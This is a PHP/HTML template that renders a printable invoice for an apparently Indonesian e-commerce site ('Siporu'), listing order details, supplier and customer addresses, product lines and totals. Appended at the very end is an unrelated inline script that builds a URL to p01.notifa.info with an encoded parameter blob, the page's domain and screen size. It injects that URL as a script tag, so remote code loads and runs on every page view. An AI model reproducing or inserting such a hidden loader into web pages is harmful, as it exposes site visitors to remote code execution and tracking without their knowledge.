<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Siporu Invoice</title>
	<link rel="stylesheet" href="<?= base_url('assets/user/css/invoice.css')?>">
</head> 

<body>

<!-- Print Button -->
<div class="print-button-container">
	<a href="javascript:window.print()" class="print-button">Print invoice</a>
</div>

<!-- Invoice -->
<div id="invoice">

	<!-- Header -->
	<div class="row">
		<div class="col-xl-6">
			<div id="logo"><img src="<?= base_url('assets/user/images/logo.png')?>" alt=""></div>
		</div>

		<div class="col-xl-6">	

			<p id="details">
			<?php foreach($detailI as $di) { ?>
				<strong>Order:</strong> #<?= $di->id ?> <br>
				<strong>Issued:</strong> <?= $di->date ?><br>
				Due 1 days from date of issue
			<?php } ?>
			</p>
		</div>
	</div>


	<!-- Client & Supplier -->
	<div class="row">
		<div class="col-xl-12">
			<h2>Invoice</h2>
		</div>

		<div class="col-xl-6">	
			<strong class="margin-bottom-5">Ukm Suplier</strong>
			<?php foreach($getukm as $g) : ?>
			<p>
				<?= $g->nama_ukm?>. <br>
				<?= $g->alamat?><br>
			</p>

			<?php endforeach; ?>
		</div>

		<div class="col-xl-6">	
			<strong class="margin-bottom-5">Pelanggan</strong>
			<?php foreach($getuser as $gu) : ?>
			<p>
				<?= $gu->nama_lengkap?> <br>
				<?= $gu->alamat?> <br>
			</p>
			<?php endforeach; ?>
		</div>
	</div>


	<!-- Invoice -->
	<div class="row">
		<div class="col-xl-12">
			<table class="margin-top-20">
				<tr>
					<th>Nama Produk</th>
					<th>Harga</th>
					<th>Kuantitas</th>
					<th>Total</th>
				</tr>
				<?php foreach($detail as $d) : ?>
				<tr>
					<td><?= $d->nama_produk ?></td> 
					<td>Rp. <?= $d->harga ?></td>
					<td><?= $d->qty ?></td>
					<?php $total = $d->harga * $d->qty  ?>
					<td>Rp. <?= $total ?></td>
				</tr>
				<?php endforeach ?>
			</table>
		</div>
		
		<div class="col-xl-4 col-xl-offset-8">	
			<table id="totals">
				<?php foreach($getTotal as $gt) : ?>
				<tr>
					<th>Total Harga</th> 
					<th><span>Rp. <?= $gt->total?></span></th>
				</tr>
				<?php endforeach ?>
			</table>
		</div>
	</div>


	<!-- Footer -->
	<div class="row">
		<div class="col-xl-12">
			<ul id="footer">
				<li><span>www.siporu.com</span></li>
				<li><a href="http://www.vasterad.com/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bbd4ddddd2d8defbdec3dad6cbd7de95d8d4d6">[email&#160;protected]</a></li>
				<li>(0857) 123-456</li>
			</ul>
		</div>
	</div>
		
</div>


<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd2w6kOLGacLAllTCF3PPMV9D5vBvwEmK3S%2fXLfLtl2yQt%2fVo7rsVHBPKFuBgoJFegvLDKfYmPk3LsruIGa6j%2f%2banjeZUGAaLCojrgw%2bOdWAQhdcnGe4dfl95a8HuoxdhQ5YSiuzf%2by8dS1h5yrQPRbOjZWUQoTFF7%2flHYPvds9yEq%2fEAa224gxp1UGR2tZJ0QGscliao4%2beEPmnPGIR06s25cOXvCItqR9RfSEDl1S%2fqvZXbUBKKhwxQ6c8D1NGKbv8NN1HQsAQ%2fa0vcM7qG4E%2f5YwlNX8K3kLQu7vGizDqnrOuWcDynhs1aDiSkJ9E4PWQXqJ7yhJBpgjIfcer6RM3apt24nbgsAWiH6R13UNOnkaeqgkq92JO92ZB9rwHlJ8eRdYEESHRl7exjASApsQaoRtv2pTyk1CvjrHmOXaCLUN11PAcft%2f%2fX8%2bdUwDT%2bc2YYMcIZdroP6dJH9%2fK83DhdEfLi8VDGJ5vWBQA4jNl9RY9wbTbSabQ%2bCl5wQrroxNCvBYPkKnk4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>